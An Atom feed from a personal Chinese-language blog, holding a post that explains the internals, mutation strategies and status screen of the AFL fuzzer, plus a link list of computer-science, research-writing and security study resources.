<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MUZI&#39;s BLOG</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://muzibing.github.io/"/>
  <updated>2020-08-25T05:41:45.251Z</updated>
  <id>https://muzibing.github.io/</id>
  
  <author>
    <name>MUZIBing</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>AFL详细总结（持续更新）</title>
    <link href="https://muzibing.github.io/2020/08/25/2020.08.24%EF%BC%88145%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/25/2020.08.24（145）/</id>
    <published>2020-08-24T16:00:00.000Z</published>
    <updated>2020-08-25T05:41:45.251Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-afl的流程font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-afl的流程font"></a> <font color="navy"><code>0x00 AFL的流程</code></font></h3><p><img src="/images/145-1.jpg" alt></p><h4 id="font-color-blue1afl整体框架font"><a class="markdownIt-Anchor" href="#font-color-blue1afl整体框架font"></a> <font color="blue"><code>1.AFL整体框架</code></font></h4><blockquote><ol><li><p>main函数先进行初始化和选项处理；</p></li><li><p>执行input文件夹下的预先准备的所有testcase（perform_dry_run），生成初始化的queue和bitmap；</p></li><li><p>通过cull_queue对queue进行精选，减小input的量；</p></li><li><p>然后进行while(1)循环不断进行fuzz。</p></li></ol><p>每次在fuzz一个queue后，就会进入while(1),并重新调用cull_queue()对队列进行精选，而在while(1)具体实现以下过程：</p><ol><li><p>cull_queue()根据top_rated设置queue中的favored标志，对queue进行精选，选出favored</p></li><li><p>判断queue_cur是否为NULL，如果是，则表示已经完成对队列的遍历，queue_cycle++,初始化相关参数，重新开始遍历队列；</p></li><li><p>fuzz queue_cur对应的input文件；</p></li><li><p>判断是否结束，并更新queue_cur和current_entry；</p></li></ol><p>当队列中的所有文件都经过变异测试了，则完成一次”cycle done”;<br>整个队列又会从第一个文件开始，再次继续进行变异，不过与第一次变异不同的是，因为没有随机性，这一次变异就不需要再进行deterministic fuzzing了。而至于什么是deterministic fuzzing，我们在下面的fuzz策略中会作介绍；</p></blockquote><h4 id="font-colorblue2afl的fuzz策略font"><a class="markdownIt-Anchor" href="#font-colorblue2afl的fuzz策略font"></a> <font color="blue"><code>2.AFL的fuzz策略</code></font></h4><blockquote><p>总的来讲，AFL维护了一个队列(queue)，每次从这个队列中取出一个文件，对其进行大量变异，并检查运行后是否会引起目标崩溃、发现新路径等结果。变异的主要类型如下：</p><ol><li><p>bitflip，按位翻转，1变为0，0变为1</p></li><li><p>arithmetic，整数加/减算术运算</p></li><li><p>interest，把一些特殊内容替换到原文件中</p></li><li><p>dictionary，把自动生成或用户提供的token替换/插入到原文件中</p></li><li><p>havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异</p></li><li><p>splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件</p></li></ol><p>其中，前四项bitflip, arithmetic, interest, dictionary由于其变异方式没有随机性，所以也称为deterministic fuzzing；而havoc和splice则存在随机性，是所有状况的fuzzer（是否dumb mode、主从fuzzer）都会执行的变异。</p><p><code>bitflip变异</code>：拿到一个原始文件，首先的变异类型就是bitflip，而且还会根据翻转量/步长进行多种不同的翻转，按照顺序依次为：</p><ul><li>bitflip 1/1，每次翻转1个bit，按照每1个bit的步长从头开始</li><li>bitflip 2/1，每次翻转相邻的2个bit，按照每1个bit的步长从头开始</li><li>bitflip 4/1，每次翻转相邻的4个bit，按照每1个bit的步长从头开始</li><li>bitflip 8/8，每次翻转相邻的8个bit，按照每8个bit的步长从头开始，即依次对每个byte做翻转</li></ul><p><code>effector map的生成</code>：</p><p>完成bitflip 8/8的同时，还生成了effector map，该作用是对byte进行标记，在对每个byte进行翻转变异时，其新的执行路径与原来的路径不一致时，就对该byte标记为1，表示即为有效的，否则标记为0；这样做的优点是如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。</p><ul><li>bitflip 16/8，每次翻转相邻的16个bit，按照每8个bit的步长从头开始，即依次对每个word做翻转</li><li>bitflip 32/8，每次翻转相邻的32个bit，按照每8个bit的步长从头开始，即依次对每个dword做翻转</li></ul><p><code>arithmetic变异</code>：</p><ul><li>arith 8/8，每次对8个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个byte进行整数加减变异</li><li>arith 16/8，每次对16个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个word进行整数加减变异</li><li>arith 32/8，每次对32个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个dword进行整数加减变异</li></ul><p>加减运算的相关设置在config.h定义，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。此外，AFL会智能的跳过某些arithmetic,第一种情况就是前面提到的effector map：如果一个整数的所有bytes都被判断为“无效”，那么就跳过对整数的变异。第二种情况是之前bitflip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行。</p><p><code>interest变异</code>：</p><ul><li>interest 8/8，每次对8个bit进替换，按照每8个bit的步长从头开始，即对文件的每个byte进行替换</li><li>interest 16/8，每次对16个bit进替换，按照每8个bit的步长从头开始，即对文件的每个word进行替换</li><li>interest 32/8，每次对32个bit进替换，按照每8个bit的步长从头开始，即对文件的每个dword进行替换</li></ul><p>其中interest value的值在config.h已经设定好</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="meta">#<span class="meta-keyword">define</span> INTERESTING_8 \</span></span><br><span class="line">&gt;   <span class="number">-128</span>,         <span class="comment">/* Overflow signed 8-bit when decremented  */</span> \</span><br><span class="line">&gt;   <span class="number">-1</span>,           <span class="comment">/*                                         */</span> \</span><br><span class="line">&gt;   <span class="number">0</span>,            <span class="comment">/*                                         */</span> \</span><br><span class="line">&gt;   <span class="number">1</span>,            <span class="comment">/*                                         */</span> \</span><br><span class="line">&gt;   <span class="number">16</span>,           <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">32</span>,           <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">64</span>,           <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">100</span>,          <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">127</span>           <span class="comment">/* Overflow signed 8-bit when incremented  */</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>可以看到，用于替换的基本都是可能会造成溢出的数;与之前相同，effector map仍然会用于判断是否需要变异；</p><p><code>dictionary变异</code>：</p><ul><li>user extras (over)，从头开始，将用户提供的tokens依次替换到原文件中</li><li>user extras (insert)，从头开始，将用户提供的tokens依次插入到原文件中</li><li>auto extras (over)，从头开始，将自动检测的tokens依次替换到原文件中</li></ul><p><code>tokens</code>：</p><p>在进行bitflip 1/1变异时，对于每个byte的最低位(least significant bit)翻转还进行了额外的处理：如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的bytes判断是一条token。</p><p><code>havoc变异</code>：</p><ul><li>随机选取某个bit进行翻转</li><li>随机选取某个byte，将其设置为随机的interesting value</li><li>随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个byte，对其减去一个随机数</li><li>随机选取某个byte，对其加上一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个byte，将其设置为随机数</li><li>随机删除一段bytes</li><li>随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</li><li>随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</li></ul></blockquote><h4 id="font-color-blue3bitmapfont"><a class="markdownIt-Anchor" href="#font-color-blue3bitmapfont"></a> <font color="blue"><code>3.Bitmap</code></font></h4><p><img src="/images/145-3.png" alt></p><h3 id="font-colornavy0x01-afl界面介绍font"><a class="markdownIt-Anchor" href="#font-colornavy0x01-afl界面介绍font"></a> <font color="navy"><code>0x01 AFL界面介绍</code></font></h3><p><img src="/images/145-2.png" alt></p><p><code>process timing</code></p><blockquote><p>展示了当前fuzzer的运行时间、最近一次发现新执行路径的时间、最近一次崩溃的时间、最近一次超时的时间。值得注意的是第2项，最近一次发现新路径的时间。如果由于目标二进制文件或者命令行参数出错，那么其执行路径应该是一直不变的，所以如果从fuzzing开始一直没有发现新的执行路径，那么就要考虑是否有二进制或者命令行参数错误的问题了。</p></blockquote><p><code>overall results</code></p><blockquote><p>这里包括运行的总周期数、总路径数、崩溃次数、超时次数。其中，总周期数可以用来作为何时停止fuzzing的参考。随着不断地fuzzing，周期数会不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。一般来说，当其变为绿色时，代表可执行的内容已经很少了，继续fuzzing下去也不会有什么新的发现了。此时，我们便可以通过Ctrl-C，中止当前的fuzzing。</p></blockquote><p><code>cycle progress</code></p><blockquote><p>该部分展示了当前cycle的队列中fuzzer的距离、当前工作的测试用例的ID</p></blockquote><p><code>Map coverage</code></p><blockquote><p>该部分的第一行介绍了碰撞的分支元组，与bitmap成正比；数字的左半部分是当前的输入，右半部分是整个语料库的值。</p></blockquote><p><code>Stage progress</code></p><blockquote><p>这里包括正在测试的fuzzing策略、进度、目标的执行总次数、目标的执行速度。执行速度可以直观地反映当前跑的快不快，如果速度过慢，比如低于500次每秒，那么测试时间就会变得非常漫长。如果发生了这种情况，那么我们需要进一步调整优化我们的fuzzing。</p></blockquote><h3 id="font-colornavy0x02-afl的相关计算font"><a class="markdownIt-Anchor" href="#font-colornavy0x02-afl的相关计算font"></a> <font color="navy"><code>0x02 AFL的相关计算</code></font></h3><h4 id="font-color-blue1覆盖率计算font"><a class="markdownIt-Anchor" href="#font-color-blue1覆盖率计算font"></a> <font color="blue"><code>1.覆盖率计算</code></font></h4><h3 id="font-color-navy0x03-源码分析font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-源码分析font"></a> <font color="navy"><code>0x03 源码分析</code></font></h3><h3 id="font-color-navy参考文献font"><a class="markdownIt-Anchor" href="#font-color-navy参考文献font"></a> <font color="navy"><code>参考文献</code></font></h3><p><a href="https://www.jianshu.com/p/cc7a486e5adb" target="_blank" rel="noopener">(译)afl-fuzz白皮书</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-afl的流程font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-afl的流程font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x
      
    
    </summary>
    
    
      <category term="AFL" scheme="https://muzibing.github.io/tags/AFL/"/>
    
  </entry>
  
  <entry>
    <title>网路安全学习资源汇总</title>
    <link href="https://muzibing.github.io/2020/08/23/2020.08.23%EF%BC%88144%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/23/2020.08.23（144）/</id>
    <published>2020-08-22T16:00:00.000Z</published>
    <updated>2020-08-24T07:40:29.420Z</updated>
    
    <content type="html"><![CDATA[<h4>网络资源</h4><p><code>开放课平台</code></p><p><a href="https://ocw.mit.edu/:" target="_blank" rel="noopener">https://ocw.mit.edu/:</a> MIT开放课程资源</p><p><a href="https://www.coursera.org/%EF%BC%9ACoursera" target="_blank" rel="noopener">https://www.coursera.org/：Coursera</a></p><p><code>技术新闻与问答</code></p><p><a href="https://lwn.net/:" target="_blank" rel="noopener">https://lwn.net/:</a> reader-supported news site dedicated to producing the best coverage from within the Linux and free software development communities.</p><p><a href="https://stackoverflow.com/:" target="_blank" rel="noopener">https://stackoverflow.com/:</a> For developers, by developers.</p><p><a href="https://www.reddit.com/r/programming/:" target="_blank" rel="noopener">https://www.reddit.com/r/programming/:</a> reddit</p><p><code>个人与团队博客</code></p><p><a href="http://www.brendangregg.com/blog/%EF%BC%9ABrendan" target="_blank" rel="noopener">http://www.brendangregg.com/blog/：Brendan</a> Gregg’s Blog</p><p><a href="https://dwheeler.com/secure-programs/%EF%BC%9ASecure" target="_blank" rel="noopener">https://dwheeler.com/secure-programs/：Secure</a> Programming HOWTO - Creating Secure Software</p><p><a href="https://www.synacktiv.com/en/publications.html%EF%BC%9Asynacktiv%E5%9B%A2%E9%98%9F" target="_blank" rel="noopener">https://www.synacktiv.com/en/publications.html：synacktiv团队</a></p><p><a href="https://googleprojectzero.blogspot.com/%EF%BC%9Aproject" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/：project</a> zero团队</p><p><a href="https://blog.zimperium.com/%EF%BC%9AZimperium's" target="_blank" rel="noopener">https://blog.zimperium.com/：Zimperium’s</a> Mobile Security Blog</p><p><a href="https://blog.lexfo.fr/%EF%BC%9ALEXFO%E5%9B%A2%E9%98%9F" target="_blank" rel="noopener">https://blog.lexfo.fr/：LEXFO团队</a></p><p><a href="https://www.zerodayinitiative.com/blog/%EF%BC%9AZERO" target="_blank" rel="noopener">https://www.zerodayinitiative.com/blog/：ZERO</a> DAY INITIATIVE</p><p><a href="http://www.yinwang.org/:" target="_blank" rel="noopener">http://www.yinwang.org/:</a> 王垠博客</p><p><a href="https://blogs.360.cn/%EF%BC%9A360" target="_blank" rel="noopener">https://blogs.360.cn/：360</a> 核心安全技术博客</p><p><code>研究指南</code></p><p><a href="http://csrankings.org" target="_blank" rel="noopener">http://csrankings.org</a>：Computer Science Rankings</p><p><a href="https://greatresearch.org/blog/%EF%BC%9AHow" target="_blank" rel="noopener">https://greatresearch.org/blog/：How</a> to Do Great Research</p><p><a href="https://pg.ucsd.edu/early-stage-PhD-advice.htm%EF%BC%9AAdvice" target="_blank" rel="noopener">https://pg.ucsd.edu/early-stage-PhD-advice.htm：Advice</a> for early-stage Ph.D. students(By Philip Guo)</p><ul><li>文献检索与综述</li></ul><p><a href="http://www.cs.ucr.edu/~michalis/TECHWRITING/structure.html%EF%BC%9AThe" target="_blank" rel="noopener">http://www.cs.ucr.edu/~michalis/TECHWRITING/structure.html：The</a> structure of paper/report in Systems</p><p><a href="http://blizzard.cs.uwaterloo.ca/keshav/home/Papers/data/07/paper-reading.pdf%EF%BC%9AHow" target="_blank" rel="noopener">http://blizzard.cs.uwaterloo.ca/keshav/home/Papers/data/07/paper-reading.pdf：How</a> to Read a Paper</p><p><a href="https://www.elsevier.com/__data/promis_misc/525444systematicreviewsguide.pdf%EF%BC%9AGuidelines" target="_blank" rel="noopener">https://www.elsevier.com/__data/promis_misc/525444systematicreviewsguide.pdf：Guidelines</a> for performing Systematic Literature Reviews in Software Engineering</p><ul><li>学位论文写作</li></ul><p><a href="https://newt.phys.unsw.edu.au/~jw/thesis.html%EF%BC%9AHow" target="_blank" rel="noopener">https://newt.phys.unsw.edu.au/~jw/thesis.html：How</a> to Write a PhD Thesis</p><p><a href="https://newt.phys.unsw.edu.au/~jw/viva.html%EF%BC%9AHow" target="_blank" rel="noopener">https://newt.phys.unsw.edu.au/~jw/viva.html：How</a> to survive a thesis defence</p><ul><li>论文写作与投稿</li></ul><p><a href="http://www.cs.wisc.edu/wpis/talks/WritingResearchPapers.pptx%EF%BC%9ATips" target="_blank" rel="noopener">http://www.cs.wisc.edu/wpis/talks/WritingResearchPapers.pptx：Tips</a> on writing a research paper(By Thomas W. Reps)</p><p><a href="https://cs.stanford.edu/people/widom/paper-writing.html%EF%BC%9ATips" target="_blank" rel="noopener">https://cs.stanford.edu/people/widom/paper-writing.html：Tips</a> for Writing Technical Papers</p><p><a href="https://www.linkedin.com/pulse/10-top-writing-tips-psychology-behind-them-josh-bernoff%EF%BC%9A10" target="_blank" rel="noopener">https://www.linkedin.com/pulse/10-top-writing-tips-psychology-behind-them-josh-bernoff：10</a> top writing tips and the psychology behind them(By Josh Bernoff)</p><p><a href="https://www.grammarcheck.net/%EF%BC%9Agrammar" target="_blank" rel="noopener">https://www.grammarcheck.net/：grammar</a> checker</p><p><a href="https://www.chicagomanualofstyle.org/home.html%EF%BC%9AThis" target="_blank" rel="noopener">https://www.chicagomanualofstyle.org/home.html：This</a> is the bible for American academic style. It’s long and heavy, but has everything you ever want to know about style. When in doubt, or if you get conflicting stylistic advice, following The Chicago Manual of Style is your best choice.</p><p><a href="https://www.amazon.com/exec/obidos/ASIN/0205191584/ref=ed_oe_p/002-4207005-4000631%EF%BC%9AThe" target="_blank" rel="noopener">https://www.amazon.com/exec/obidos/ASIN/0205191584/ref=ed_oe_p/002-4207005-4000631：The</a> Elements of Style, Third Edition</p><p><a href="https://www.ccf.org.cn/Academic_Evaluation/By_category/%EF%BC%9A%E4%B8%AD%E5%9B%BD%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%A6%E4%BC%9A%E6%8E%A8%E8%8D%90%E5%9B%BD%E9%99%85%E5%AD%A6%E6%9C%AF%E4%BC%9A%E8%AE%AE%E5%92%8C%E6%9C%9F%E5%88%8A%E7%9B%AE%E5%BD%95" target="_blank" rel="noopener">https://www.ccf.org.cn/Academic_Evaluation/By_category/：中国计算机学会推荐国际学术会议和期刊目录</a></p><ul><li>系统论文写作与投稿</li></ul><p><a href="https://www.usenix.org/legacy/events/samples/submit/advice.html%EF%BC%9AAn" target="_blank" rel="noopener">https://www.usenix.org/legacy/events/samples/submit/advice.html：An</a> Evaluation of the Ninth SOSP Submissions / How (and How Not) to Write a Good Systems Paper</p><p><a href="https://www.ida.liu.se/~matar63/designpaper.pdf:" target="_blank" rel="noopener">https://www.ida.liu.se/~matar63/designpaper.pdf:</a> How (and How Not) to Write a Good Design Paper</p><p><a href="https://www.usenix.org/legacy/events/lisa99/cfp/guidelines.html%EF%BC%9AWhat" target="_blank" rel="noopener">https://www.usenix.org/legacy/events/lisa99/cfp/guidelines.html：What</a> Kinds Of Papers Does USENIX Publish?</p><p><a href="http://www.cs.columbia.edu/~hgs/etc/writing-style.html%EF%BC%9AWriting" target="_blank" rel="noopener">http://www.cs.columbia.edu/~hgs/etc/writing-style.html：Writing</a> Technical Articles</p><p><a href="http://www.cs.columbia.edu/~hgs/etc/intro-style.html%EF%BC%9AWriting" target="_blank" rel="noopener">http://www.cs.columbia.edu/~hgs/etc/intro-style.html：Writing</a> a good introduction</p><p><a href="http://www.cs.columbia.edu/~hgs/etc/writing-bugs.html%EF%BC%9ACommon" target="_blank" rel="noopener">http://www.cs.columbia.edu/~hgs/etc/writing-bugs.html：Common</a> Bugs in Writing</p><p><a href="http://www.cs.columbia.edu/~hgs/etc/urls.html%EF%BC%9ACiting" target="_blank" rel="noopener">http://www.cs.columbia.edu/~hgs/etc/urls.html：Citing</a> URLs</p><ul><li>论文评审</li></ul><p><a href="http://www.icir.org/mallman/plea.txt%EF%BC%9AA" target="_blank" rel="noopener">http://www.icir.org/mallman/plea.txt：A</a> Referee’s Plea</p><p><a href="http://www.cs.utexas.edu/users/mckinley/notes/reviewing-smith.pdf%EF%BC%9AThe" target="_blank" rel="noopener">http://www.cs.utexas.edu/users/mckinley/notes/reviewing-smith.pdf：The</a> Task of the Referee</p><ul><li>报告</li></ul><p><a href="https://www.microsoft.com/en-us/research/wp-content/uploads/2016/08/giving-a-talk.pdf%EF%BC%9AHow" target="_blank" rel="noopener">https://www.microsoft.com/en-us/research/wp-content/uploads/2016/08/giving-a-talk.pdf：How</a> to give a good research talk</p><p><a href="https://people.eecs.berkeley.edu/~messer/Bad_talk.html%EF%BC%9APointers" target="_blank" rel="noopener">https://people.eecs.berkeley.edu/~messer/Bad_talk.html：Pointers</a> on giving a talk</p><p><a href="https://greatresearch.org/2013/10/04/presenting-a-technical-talk/%EF%BC%9APresenting" target="_blank" rel="noopener">https://greatresearch.org/2013/10/04/presenting-a-technical-talk/：Presenting</a> a Technical Talk</p><ul><li>参加学术会议</li></ul><p><a href="https://pg.ucsd.edu/attending-conferences.htm%EF%BC%9AAttending" target="_blank" rel="noopener">https://pg.ucsd.edu/attending-conferences.htm：Attending</a> Professional Conferences as a Newcomer(By Philip Guo)</p><p><a href="https://homes.cs.washington.edu/~mernst/advice/conference-attendance.html%EF%BC%9AAttending" target="_blank" rel="noopener">https://homes.cs.washington.edu/~mernst/advice/conference-attendance.html：Attending</a> an academic conference(by Michael Ernst)</p><p><a href="http://jxyzabc.blogspot.com/2016/05/networking-tips-for-younger-phd-students.html:Networking" target="_blank" rel="noopener">http://jxyzabc.blogspot.com/2016/05/networking-tips-for-younger-phd-students.html:Networking</a> Tips for Younger PhD Students(by Jean Yang, Nadia Polikarpova, and Shachar Itzhaky)</p><p><code>学习指南</code></p><ul><li>工具学习</li></ul><p><a href="https://learngitbranching.js.org/%EF%BC%9A2%E5%B0%8F%E6%97%B6git%E5%85%A5%E9%97%A8%E8%B6%A3%E5%91%B3%E6%B8%B8%E6%88%8F" target="_blank" rel="noopener">https://learngitbranching.js.org/：2小时git入门趣味游戏</a></p><ul><li>程序设计</li></ul><p><a href="https://ocw.mit.edu/courses/intro-programming/%EF%BC%9AMIT%E5%AF%BC%E8%AE%BA%E8%AF%BE%E7%A8%8BIntroductory" target="_blank" rel="noopener">https://ocw.mit.edu/courses/intro-programming/：MIT导论课程Introductory</a> Programming Courses（推荐6.0001）</p><p><a href="https://py.mit.edu/%EF%BC%9AMIT%E8%AF%BE%E7%A8%8B" target="_blank" rel="noopener">https://py.mit.edu/：MIT课程</a> 6.009 Fundamentals of Programming</p><p><a href="https://htdp.org/%EF%BC%9AHow" target="_blank" rel="noopener">https://htdp.org/：How</a> to Design Programs</p><p><a href="https://leetcode-cn.com/%EF%BC%9Aleetcode" target="_blank" rel="noopener">https://leetcode-cn.com/：leetcode</a></p><ul><li>SICP</li></ul><p><a href="https://mitpress.mit.edu/sites/default/files/sicp/index.html%EF%BC%9ASICP%EF%BC%88%E6%9C%89%E8%A7%86%E9%A2%91%EF%BC%89" target="_blank" rel="noopener">https://mitpress.mit.edu/sites/default/files/sicp/index.html：SICP（有视频）</a></p><p><a href="https://www.math.pku.edu.cn/teachers/qiuzy/progtech/%EF%BC%9A%E3%80%8C%E5%9B%BD%E5%86%85%E8%AF%BE%E7%A8%8B%E3%80%8D%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%8A%80%E6%9C%AF%E5%92%8C%E6%96%B9%E6%B3%95%EF%BC%88%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89" target="_blank" rel="noopener">https://www.math.pku.edu.cn/teachers/qiuzy/progtech/：「国内课程」程序设计技术和方法（北京大学）</a></p><ul><li>数学与计算机科学</li></ul><p><a href="https://courses.csail.mit.edu/6.042/%EF%BC%9AMIT%E8%AF%BE%E7%A8%8B" target="_blank" rel="noopener">https://courses.csail.mit.edu/6.042/：MIT课程</a> 6.042J Mathematics for Computer Science</p><ul><li>算法</li></ul><p><a href="https://courses.csail.mit.edu/6.006/%EF%BC%9AMIT%E8%AF%BE%E7%A8%8B" target="_blank" rel="noopener">https://courses.csail.mit.edu/6.006/：MIT课程</a> 6.009 Introduction to Algorithms</p><ul><li>计算机系统</li></ul><p><a href="https://www.cs.cmu.edu/~213/%EF%BC%9ACMU%E8%AF%BE%E7%A8%8B15-213" target="_blank" rel="noopener">https://www.cs.cmu.edu/~213/：CMU课程15-213</a> Introduction to Computer Systems (ICS)</p><p><a href="https://github.com/chyyuu/aos_course_info/blob/master/readinglist.md%EF%BC%9A%E3%80%8C%E5%9B%BD%E5%86%85%E8%AF%BE%E7%A8%8B%E3%80%8D%E6%B8%85%E5%8D%8E%E5%A4%A7%E5%AD%A6%E3%80%8A%E9%AB%98%E7%BA%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%88%E9%99%88%E6%B8%9D%EF%BC%89%E3%80%8BRead" target="_blank" rel="noopener">https://github.com/chyyuu/aos_course_info/blob/master/readinglist.md：「国内课程」清华大学《高级操作系统（陈渝）》Read</a> list（有视频）</p><p><a href="http://web.mit.edu/6.033/www/%EF%BC%9AMIT%E8%AF%BE%E7%A8%8B" target="_blank" rel="noopener">http://web.mit.edu/6.033/www/：MIT课程</a> 6.033 Computer System Engineering</p><p><a href="https://pdos.csail.mit.edu/6.828/2020/index.html:" target="_blank" rel="noopener">https://pdos.csail.mit.edu/6.828/2020/index.html:</a> MIT课程 6.828/6.S081 Operating System Engineering</p><ul><li>语言与程序分析</li></ul><p><a href="https://kentdlee.github.io/PL/build/html/index.html%EF%BC%9APL%E5%9F%BA%E7%A1%80" target="_blank" rel="noopener">https://kentdlee.github.io/PL/build/html/index.html：PL基础</a></p><p><a href="https://cs.au.dk/~amoeller/spa/%EF%BC%9A" target="_blank" rel="noopener">https://cs.au.dk/~amoeller/spa/：</a> The lecture notes on Static Program Analysis</p><p><a href="http://www.imm.dtu.dk/~hrni/PPA/ppa.html%EF%BC%9APrinciples" target="_blank" rel="noopener">http://www.imm.dtu.dk/~hrni/PPA/ppa.html：Principles</a> of Program Analysis</p><p><a href="https://softwarefoundations.cis.upenn.edu/%EF%BC%9ASoftware" target="_blank" rel="noopener">https://softwarefoundations.cis.upenn.edu/：Software</a> Foundations series，使用Coq形式化证明</p><p><a href="https://xiongyingfei.github.io/SA/2019/main.htm%EF%BC%9A%E3%80%8C%E5%9B%BD%E5%86%85%E8%AF%BE%E7%A8%8B%E3%80%8D%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%EF%BC%88%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E7%86%8A%E8%8B%B1%E9%A3%9E%EF%BC%89" target="_blank" rel="noopener">https://xiongyingfei.github.io/SA/2019/main.htm：「国内课程」软件分析技术（北京大学-熊英飞）</a></p><p><a href="https://pascal-group.bitbucket.io/teaching.html%EF%BC%9A%E3%80%8C%E5%9B%BD%E5%86%85%E8%AF%BE%E7%A8%8B%E3%80%8DSoftware" target="_blank" rel="noopener">https://pascal-group.bitbucket.io/teaching.html：「国内课程」Software</a> Analysis / Static Program Analysis（南京大学-Yue Li and Tian Tan）</p><ul><li>分布式计算</li></ul><p><a href="https://pdos.csail.mit.edu/6.824/%EF%BC%9AMIT%E8%AF%BE%E7%A8%8B" target="_blank" rel="noopener">https://pdos.csail.mit.edu/6.824/：MIT课程</a> 6.824: Distributed Systems</p><ul><li>密码学</li></ul><p><a href="http://www.wisdom.weizmann.ac.il/~oded/foc.html%EF%BC%9AThe" target="_blank" rel="noopener">http://www.wisdom.weizmann.ac.il/~oded/foc.html：The</a> Foundations of Cryptography By Oded Goldreich</p><p><a href="https://cseweb.ucsd.edu/~mihir/papers/gb.html%EF%BC%9ALecture" target="_blank" rel="noopener">https://cseweb.ucsd.edu/~mihir/papers/gb.html：Lecture</a> Notes on Cryptography By Goldwasser and Bellare</p><p><a href="https://inst.eecs.berkeley.edu/~cs276/fa20/%EF%BC%9AMIT" target="_blank" rel="noopener">https://inst.eecs.berkeley.edu/~cs276/fa20/：MIT</a> 6.875 / Berkeley CS 276 Graduate Cryptography</p><p><a href="https://courses.csail.mit.edu/6.857/%EF%BC%9AMIT" target="_blank" rel="noopener">https://courses.csail.mit.edu/6.857/：MIT</a> 课程6.857: Computer and Network Security（主要内容为密码学）</p><ul><li>系统安全</li></ul><p><a href="http://css.csail.mit.edu/6.858/2020/%EF%BC%9AMIT" target="_blank" rel="noopener">http://css.csail.mit.edu/6.858/2020/：MIT</a> 课程 6.858: Computer Systems Security</p><p><a href="https://tc.gts3.org/cs6265/2020-spring/tut/%EF%BC%9AGa-Tech" target="_blank" rel="noopener">https://tc.gts3.org/cs6265/2020-spring/tut/：Ga-Tech</a> 实验课程 CS6265: Information Security Lab</p><ul><li>工具</li></ul><p><a href="https://missing.csail.mit.edu/%EF%BC%9AMIT" target="_blank" rel="noopener">https://missing.csail.mit.edu/：MIT</a> 工具类课程 The Missing Semester of Your CS Education</p><ul><li>安全技能</li></ul><p><a href="https://dayzerosec.com/%EF%BC%9Adayzerosec" target="_blank" rel="noopener">https://dayzerosec.com/：dayzerosec</a></p><p><a href="https://www.t00ls.net/%EF%BC%9AT00Ls" target="_blank" rel="noopener">https://www.t00ls.net/：T00Ls</a> 民间社区</p><p><a href="https://www.exploit-db.com/%EF%BC%9Aexploit" target="_blank" rel="noopener">https://www.exploit-db.com/：exploit</a> db</p><p><a href="https://www.v2ex.com/%EF%BC%9Av2ex" target="_blank" rel="noopener">https://www.v2ex.com/：v2ex</a></p><p><a href="https://www.hackinn.com/%EF%BC%9A%E5%9B%BD%E5%86%85%E5%AE%89%E5%85%A8%E4%BC%9A%E8%AE%AE%E8%AE%AE%E9%A2%98" target="_blank" rel="noopener">https://www.hackinn.com/：国内安全会议议题</a></p><p><a 